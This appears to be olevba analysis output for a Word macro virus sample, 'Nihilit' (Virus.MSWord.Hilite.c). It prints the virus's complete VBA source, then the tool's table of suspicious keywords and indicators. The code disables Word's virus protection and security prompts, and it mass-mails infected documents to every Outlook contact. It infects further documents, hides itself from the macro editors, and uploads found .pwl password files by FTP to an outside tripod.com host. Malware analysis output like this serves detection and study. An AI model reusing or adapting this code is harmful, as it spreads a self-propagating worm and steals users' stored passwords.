olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hilite.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hilite.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Nihilit.bas 
in file: Virus.MSWord.Hilite.c - OLE stream: 'Macros/VBA/Nihilit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' Nihilit
' by Necronomion
' based on Jackal by WalruS
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Sub AutoClose()
    On Error Resume Next
        With Options
            .VirusProtection = False
            .ConfirmConversions = False
            .SaveNormalPrompt = False
        End With
    Application.DisplayAlerts = wdAlertsNone
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.VBComponents.Item("Nihilit").Name <> "Nihilit" Then
    ActiveDocument.VBProject.VBComponents("Nihilit").Export ("C:\Windows\Nihilit.drv")
    SetAttr "C:\Windows\Nihilit.drv", 6
    End If
    Set Ni_OApp = CreateObject("Outlook.Application")
    Set Ni_Mapi = Ni_OApp.GetNameSpace("MAPI")
    For Each Ni_AddList In Ni_Mapi.AddressLists
    If Ni_AddList.AddressEntries.Count <> 0 Then
    For Ni_AddListCount = 1 To Ni_AddList.AddressEntries.Count
    Set Ni_AddListEntry = Ni_AddList.AddressEntries(Ni_AddListCount)
    Set Ni_msg = Ni_OApp.CreateItem(0)
    Ni_msg.To = Ni_AddListEntry.Address
    Ni_msg.Subject = "Check this!!!"
    Ni_msg.Body = "I hope it will be a good german exam!!!;o)." + vbCrLf + "Nihilit"
    Ni_msg.Attachments.Add Environ("WINDIR") & "\Nihilit.doc"
    Ni_msg.DeleteAfterSubmit = True
    If Ni_msg.To <> "" Then
    Ni_msg.Send
End If

    Call InfectDocument
    If Month(Now) = Day(Now) Then Call Pwdstealer
    NormalTemplate.Saved = True
End Sub

Sub InfectDocument()
    On Error Resume Next
    If ActiveDocument.VBProject.VBComponents.Item("Nihilit").Name <> "Nihilit" Then
    ActiveDocument.VBProject.VBComponents.import ("C:\Windows\Nihilit.drv")
    ActiveDocument.Save
    End If
End Sub

Sub Pwdstealer()
    On Error Resume Next
    With Application.FileSearch
.filename = "*.pwl"
.LookIn = "c:"
.Execute
For i = 1 To .FoundFiles.Count
shell "ftp http://members.tripod.com/Nihilit/"
shell "nihilit"
shell "killer"
shell "post" & .FoundFiles(i)
shell "bye"
Next i
End With
End Sub

Sub ToolsOptions()
    On Error Resume Next
    Options.VirusProtection = 1
    Options.SaveNormalPrompt = 1
    Dialogs(wdDialogToolsOptions).Show
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
End Sub

Sub ToolsSecurity()
On Error Resume Next
CommandBars("Macro").Controls("Security...").Enabled = True
Dialogs(wdDialogToolsSecurity).Show
CommandBars("Macro").Controls("Security...").Enabled = False
End Sub

Sub FileTemplates()
End Sub

Sub ToolsMacro()
    Call Stealth
    Dialogs(wdDialogToolsMacro).Display
End Sub

Sub ViewVBCode()
    Call Stealth
    ShowVisualBasicEditor = True
End Sub

Sub Stealth()
    On Error Resume Next
    Application.OrganizerDelete Source:=NormalTemplate.Name, _
    Name:="Nihilit", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerDelete Source:=ActiveDocument.Name, _
    Name:="Nihilit", Object:=wdOrganizerObjectProjectItems
    NormalTemplate.Saved = True
    ActiveDocument.Saved = True
End Sub
Sub HelpAbout()
WordBasic.FileNew
    WordBasic.ToggleFull
    WordBasic.DocMaximize
    WordBasic.Font "Comic Sans MS"
    WordBasic.FontSize 60
    WordBasic.Bold
    WordBasic.Insert "Check this!"
    WordBasic.StartOfLine
    WordBasic.CharRight 1, 1
    WordBasic.FormatFont Points:="48", Color:=6
    WordBasic.EndOfLine
    WordBasic.InsertPara
    WordBasic.InsertPara
    WordBasic.FontSize 48
    WordBasic.Insert "Nihilit was coded by Necronomikon"
End Sub
If Month(Now()) = 12 And Day(Now()) = 14 Then
MsgBox Chr(78) + Chr(105) + Chr(104) + Chr(105) + Chr(108) + Chr(105) + Chr(116) + Chr(32) + Chr(119) + Chr(97) + Chr(115) + Chr(32) + Chr(99) + Chr(111) + Chr(100) + Chr(101) + Chr(100) + Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(78) + Chr(101) + Chr(99) + Chr(114) + Chr(111) + Chr(110) + Chr(111) + Chr(109) + Chr(105) + Chr(107) + Chr(111) + Chr(110) + Chr(46)
End If
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://members.tripo|URL                                          |
|          |d.com/Nihilit/      |                                             |
|IOC       |winmm.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

